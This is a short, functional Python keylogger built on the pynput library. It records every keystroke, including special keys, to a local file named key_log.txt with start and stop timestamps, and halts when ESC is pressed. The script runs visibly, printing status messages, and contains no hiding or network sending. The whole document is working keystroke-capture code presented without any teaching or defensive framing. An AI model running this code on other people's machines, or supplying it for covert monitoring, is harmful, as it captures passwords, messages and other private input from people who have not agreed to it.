from pynput import keyboard
from datetime import datetime

LOG_FILE = "key_log.txt"

with open(LOG_FILE, "a") as f:
    f.write(f"\n\n--- Keylogger started at {datetime.now()} ---\n")

def on_press(key):
    try:
        
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        
        special_key = str(key).replace("Key.", "").upper()
        with open(LOG_FILE, "a") as f:
            f.write(f" [{special_key}] ")

def on_release(key):
    
    if key == keyboard.Key.esc:
        with open(LOG_FILE, "a") as f:
            f.write(f"\n--- Keylogger stopped at {datetime.now()} ---\n")
        print("Keylogger stopped.")
        return False
if __name__ == "__main__":
    print("Keylogger started... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
